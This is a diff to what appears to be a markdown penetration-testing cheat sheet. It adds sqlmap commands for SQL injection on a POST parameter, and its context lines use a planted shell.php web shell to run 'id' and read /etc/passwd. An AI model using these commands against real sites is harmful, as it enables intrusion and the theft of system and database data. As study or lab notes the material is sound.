@@ -41,6 +41,16 @@
 - __Now navigate to that path where you write the `shell.php`__
   - > __```<url>/shell.php?cmd=id```__
   - > __```<url>/shell.php?cmd=cat /etc/passwd```__
+## sqlmap 
+
+- __`sqlmap -u "<url>" --data "words_exact" -p words_exact --method POST`__
+- __OR__
+![image2](Image/sqlmap.png)
+- __Save the above post request in a file `request`__
+- __`sqlmap -r request -p words_exact --technique=E`__
+  - __`-p` ---> payload where you want to use it__
+  - __`--technique=E`__
+    - > __E= Error based, U= UNION base, B= BOOLEAN base__
 ## [SQL Injection](sql.md)
 ## SQL Login bypass
 ```
